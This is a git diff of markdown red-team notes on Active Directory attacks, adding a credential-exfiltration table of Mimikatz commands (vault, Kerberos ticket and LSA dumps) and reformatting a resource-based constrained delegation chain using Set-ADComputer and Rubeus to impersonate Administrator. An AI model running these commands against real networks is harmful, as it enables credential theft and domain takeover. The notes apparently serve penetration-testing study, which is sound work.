@@ -282,14 +282,26 @@ $null | winrs -r:follow-0xd4y C:\PATH\TO\Loader.exe -path http://127.0.0.1:8080/
 
 ⭐ Keep your eyes on the goals of your operation, and avoid getting DA privileges if it is not required. This will greatly help in avoiding detection.
 
-## Session Hijack
+## Credential Exfiltration
+
+### Session Hijack
 
 - if user has active session in workstation where you have local admin, you can obtain their TGT (even if they are a domain admin)
     - can be found with `Invoke-UserHunter -GroupName "<GROUP_NAME>"`
         - add the `-CheckAccess` parameter to check if you have local admin access
     - works by using `Get-NetGroupMember` and `Get-NetSession`
-- you can then extract the user’s TGT with `Invoke-Mimikatz –Command '"sekurlsa::tickets /export/ex"’`
+- you can then extract the user’s TGT with `Invoke-Mimikatz –Command '"sekurlsa::tickets /export"’`
 - find which computers a DA has a session on with `Find-DomainUserLocation`
+
+### Other
+
+These are several different methods to exfiltrate credentials
+
+| Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' | Extract creds from https://attack.mitre.org/techniques/T1555/004/ (can contain creds used for scheduling tasks, web credentials, etc.) |
+| --- | --- |
+| Invoke-Mimikatz -Command '"kerberos::list /export"' | Extract tickets |
+| Invoke-Mimikatz -Command '"lsadump::lsa /patch"' | Dump local creds |
+- note the vault exfiltration technique is highly important as this may reveal the creds of additional users
 
 ## Kerberoast
 
@@ -392,7 +404,7 @@ Suppose a user wants to access a web server:
 4. Web server uses user’s TGT to request a TGS from the DC for the database server
 5. Web server service account connects to database service as the user
 
-### T****************************************************************hree Types of Kerberos Delegation****************************************************************
+### Three Types of Kerberos Delegation
 
 1. **Unconstrained Delegation**
     - server can access any service on any computer on behalf of that user
@@ -463,27 +475,25 @@ Rubeus.exe ptt /ticket:<b64_ticket>
 5. KDC checks `msDS-AllowedToDelegateTo` field on web server service account. TGS is sent if the service is allowed (S4U2Proxy)
 6. Web service uses TGS to authenticate to CIFS on file server as Joe.
 - note the big problem in step 2, this means you can access CIFS on file_server.0xd4y_notes.local by impersonating any user including a domain admin
-
-********************Resource-based Constrained Delegation********************
-
-- the service owner chooses who can delegate to it as defined by `msDS-AllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`)
-- with `GenericAll` or `GenericWrite` to the server, you can run the following:
-
-```powershell
-# Check for interesting ACLs on account you own
-Find-InterestingDomainACL | ?{$_.identityreferencename -match '0xd4y'}
-
-# Add your owned machine account to trusted delegate to 
-Set-ADComputer -Identity "target_machine" -PrincipalsAllowedToDelegateToAccount "0xd4y-comp$"
-
-# Get hash for 0xd4y-comp$
-Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
-
-# Use Rubeus to access HTTP service as domain admin (can pick whatever service you want)
-Rubeus.exe s4u /user:0xd4y-comp$ /aes256:<MACHINE_ACCOUNT_HASH> /msdsspn:HTTP/follow-0xd4y /impersonateuser:Administrator /ptt
-```
-
-- with write permissions you can instead change the delegation of that machine (e.g. changing constrained to unconstrained), but this is noisier
+1. ********************Resource-based Constrained Delegation********************
+    - the service owner chooses who can delegate to it as defined by `msDS-AllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`)
+    - with `GenericAll` or `GenericWrite` to the server, you can run the following:
+    
+    ```powershell
+    # Check for interesting ACLs on account you own
+    Find-InterestingDomainACL | ?{$_.identityreferencename -match '0xd4y'}
+    
+    # Add your owned machine account to trusted delegate to 
+    Set-ADComputer -Identity "target_machine" -PrincipalsAllowedToDelegateToAccount "0xd4y-comp$"
+    
+    # Get hash for 0xd4y-comp$
+    Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+    
+    # Use Rubeus to access HTTP service as domain admin (can pick whatever service you want)
+    Rubeus.exe s4u /user:0xd4y-comp$ /aes256:<MACHINE_ACCOUNT_HASH> /msdsspn:HTTP/follow-0xd4y /impersonateuser:Administrator /ptt
+    ```
+    
+    - with write permissions you can instead change the delegation of that machine (e.g. changing constrained to unconstrained), but this is noisier
 
 ## DNSAdmins
 
@@ -1196,6 +1206,8 @@ You can either enable logging via the registry or via group policies.
     - contains binary (MS-RPRN.exe) used for abusing print spooler bug
 8. [Certify](https://github.com/GhostPack/Certify)
     - AD CS exploitation
+9. [Rubeus](https://github.com/GhostPack/Rubeus)
+    - Kerberos abuse
 
 # References
 
